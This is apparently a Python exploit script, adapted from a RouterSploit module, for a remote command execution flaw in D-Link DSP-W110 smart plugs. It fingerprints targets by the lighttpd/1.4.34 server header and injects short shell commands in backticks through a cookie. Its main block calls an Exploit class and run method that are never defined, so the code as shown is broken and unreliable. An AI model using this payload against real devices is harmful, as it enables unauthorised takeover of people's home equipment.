target = ""
# rsf exploit module
# description: Module exploits RCE vulnerability in D-Link DSP-W110 devices
import requests

def execute(target, port, cmd):
    try:
        if len(cmd) > 18:
            return False
        cookies = {"i": f"`{cmd}`"}
        requests.get(f"http://{target}:{port}/", cookies=cookies, timeout=5)
        return True
    except:
        return False

def check(target, port=80):
    try:
        response = requests.get(f"http://{target}:{port}/", timeout=5)
        return response.status_code == 200 and "Server" in response.headers and "lighttpd/1.4.34" in response.headers['Server']
    except:
        return False



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
